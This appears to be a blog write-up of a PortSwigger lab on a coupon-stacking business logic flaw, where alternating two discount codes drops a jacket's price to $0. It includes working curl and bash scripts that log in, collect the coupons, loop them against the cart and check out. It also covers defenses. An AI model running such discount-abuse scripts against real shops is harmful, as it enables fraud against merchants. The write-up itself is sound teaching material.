---
layout: post
title: "PortSwigger: Flawed enforcement of business rules"
date: 2027-11-03 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, BusinessLogic]
tags: [portswigger, business-logic, logic-flaw, coupon, discount-stacking, e-commerce, cwe-841]
---

A shop gives you two real discount codes and politely refuses to let you apply the *same* code twice in a row. Fine — so apply them in turns. Because the site only remembers the **last** coupon you used, not every coupon you've *ever* used, alternating the two codes lets you stack discounts forever until a $1337 jacket costs $0. This is a **business logic vulnerability** ([CWE-841](https://cwe.mitre.org/data/definitions/841.html)) — the rule the business intended is not the rule the code enforces.

## Overview

The goal is to buy the "Lightweight l33t leather jacket" ($1337.00) with only $100.00 of store credit. The shop hands out two valid coupons:

- `NEWCUST5` — a flat **$5 off**, advertised to every new customer.
- `SIGNUP30` — **30% off**, revealed after you join the newsletter (`POST /sign-up` with an email; the confirmation banner prints the code).

Applying the same coupon twice consecutively is rejected with *"Coupon already applied"*. But there is no global record of which coupons have been redeemed — only the most recent one. So the dedup check is **adjacency-only**, and it collapses the moment you interleave the two codes.

## The technique

The developer wanted "each coupon usable once." What they actually shipped was "the same coupon can't be applied twice *in a row*." Those are different rules, and the gap between them is the bug:

```
SIGNUP30  -> 30% off
NEWCUST5  -> $5 off       (last code was SIGNUP30, so allowed)
SIGNUP30  -> 30% off      (last code was NEWCUST5, so allowed again)
NEWCUST5  -> $5 off
...
```

Every request is a legitimate coupon on a legitimate cart — nothing is forged or tampered. Each pass simply strips more off the total, with no cap, until it bottoms out at $0.00 — comfortably under the $100 store credit.

## Solution

1. Log in with the standard lab account and add the jacket to the cart:

   ```bash
   csrf=$(curl -sk -c cookies.txt "https://TARGET/login" | grep -oP 'name="csrf" value="\K[^"]+')
   curl -sk -b cookies.txt -c cookies.txt "https://TARGET/login" \
     -d "csrf=$csrf&username=wiener&password=peter"
   curl -sk -b cookies.txt "https://TARGET/cart" -d "productId=1&redir=PRODUCT&quantity=1"
   ```

2. Grab the second coupon by signing up for the newsletter — the `SIGNUP30` code appears on the confirmation banner:

   ```bash
   csrf=$(curl -sk -b cookies.txt "https://TARGET/" | grep -A4 'action=/sign-up' | grep -oP 'name="csrf" value="\K[^"]+')
   curl -sk -b cookies.txt "https://TARGET/sign-up" -d "csrf=$csrf&email=wiener@test.com"
   ```

3. Alternate the two codes against `POST /cart/coupon`, watching the total fall, until it drops under $100:

   ```bash
   for i in $(seq 0 30); do
     csrf=$(curl -sk -b cookies.txt "https://TARGET/cart" | grep -oP 'name="csrf" value="\K[^"]+' | head -1)
     c=$([ $((i%2)) -eq 0 ] && echo SIGNUP30 || echo NEWCUST5)
     curl -sk -b cookies.txt "https://TARGET/cart/coupon" -d "csrf=$csrf&coupon=$c" -o /dev/null
     t=$(curl -sk -b cookies.txt "https://TARGET/cart" | tr '\n' ' ' | grep -oP 'Total:</th>\s*<th>\$\K[0-9.]+' | head -1)
     echo "$c -> \$$t"; awk "BEGIN{exit !($t < 100)}" && break
   done
   # SIGNUP30 -> $935.90 ... -> $0.00
   ```

4. Check out the now-free cart:

   ```bash
   csrf=$(curl -sk -b cookies.txt "https://TARGET/cart" | grep -oP 'name="csrf" value="\K[^"]+' | head -1)
   curl -sk -b cookies.txt "https://TARGET/cart/checkout" -d "csrf=$csrf"
   # -> 303 /cart/order-confirmation?order-confirmed=true
   ```

The lab status banner flips to **Solved**.

## Why it worked

The "no reuse" rule was enforced as a **sequence check against the previous action** instead of as a **persistent per-coupon usage count**. Each coupon, applied in isolation, is perfectly valid — the application never anticipated the *order* in which a customer might apply them. That is the signature of a business logic flaw: the code faithfully enforces a rule, just not the rule the business actually meant.

It's worth distinguishing this from two neighbours:

- It is **not a race condition** (CWE-367) — those fire the *same* coupon concurrently through a non-atomic check-then-write. Here every request is sequential.
- It is **not client-side tampering** (CWE-602) — no price, quantity, or discount field is forged. Only legitimate codes are applied, in an unexpected sequence.

## Fix / defense

- Track redeemed coupons as a **persistent per-(user, coupon) set**, not "the last code applied." Reject any code already in the set regardless of ordering — ideally backed by a `UNIQUE` constraint so a second redemption fails at the database layer.
- **Cap the total discount** and validate the final price against an authoritative server-side floor before completing checkout.
- Model the checkout as an explicit **state machine** and assert business invariants as preconditions on each transition, rather than ad-hoc "is this the same as last time" checks.
